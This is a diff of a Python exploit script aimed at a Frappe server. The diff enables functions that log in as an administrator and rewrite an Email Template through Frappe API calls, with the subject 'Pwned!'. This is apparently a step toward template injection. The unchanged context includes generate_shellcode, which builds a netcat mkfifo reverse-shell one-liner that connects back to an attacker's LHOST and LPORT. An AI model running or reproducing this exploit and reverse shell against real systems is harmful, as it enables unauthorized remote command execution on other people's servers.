@@ -165,41 +165,43 @@ def create_email_template(ip, session, admin_email, template):
 
 	return template_name
 
-# def update_template(ip, session, admin_email, template_name, template):
-# 	# Start by getting template information
-# 	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"
+def update_template(ip, session, admin_email, template_name, template):
+	# Start by getting template information
+	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"
 
-# 	r = session.get(target)
-# 	template_info = json.loads(r.text)
+	r = session.get(target)
+	template_info = json.loads(r.text)
 
-# 	curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
-# 	creation_time = template_info["docs"][0]["creation"]
-# 	print("Got creation time :", creation_time)
-# 	print("Cur time: ", curtime)
+	with open("template_info.json", "w") as f:
+		f.write(json.dumps(template_info))
 
-# 	doc = {
-# 		"modified":curtime,
-# 		"owner":admin_email,
-# 		"modified_by":admin_email,
-# 		"docstatus":0,
-# 		"idx":0,
-# 		"response":f"<div>{template}</div>",
-# 		"doctype":"Email Template",
-# 		"creation":creation_time,
-# 		"name":template_name,
-# 		"subject":"Pwned!"
-# 	}
+	# curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
+	creation_time = template_info["docs"][0]["creation"]
+	modified_time = template_info["docs"][0]["modified"]
+	print("Got creation time :", creation_time)
+	print("Mod time: ", modified_time)
 
-# 	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
+	doc = {
+		"modified":modified_time,
+		"owner":admin_email,
+		"modified_by":admin_email,
+		"docstatus":0,
+		"idx":0,
+		"response":f"<div>{template}</div>",
+		"doctype":"Email Template",
+		"creation":creation_time,
+		"name":template_name,
+		"subject":"Pwned!"
+	}
 
-# 	data = {
-# 		"doc": json.dumps(doc),
-# 		"action": "Save"
-# 	}
+	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
 
-# 	r = session.post(target, data=data)
+	data = {
+		"doc": json.dumps(doc),
+		"action": "Save"
+	}
 
-	# print(r.text)
+	r = session.post(target, data=data)
 
 def generate_shellcode(LHOST, LPORT):
 	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
@@ -261,9 +263,11 @@ def main():
 	session = login(ip, admin_email, new_password)
 
 	# execute_command(ip, session, admin_email, "whoami")
-	# print(f"Created new template named: {template_name}")
+	template_name = create_email_template(ip, session, admin_email, "baseline")
+	print(f"Created new template named: {template_name}")
+	# template_name = "c048e86f"
 
-	# update_template(ip, session, admin_email, template_name, "baseline2")
+	update_template(ip, session, admin_email, template_name, "baseline3")
 
 if __name__ == '__main__':
 	main()
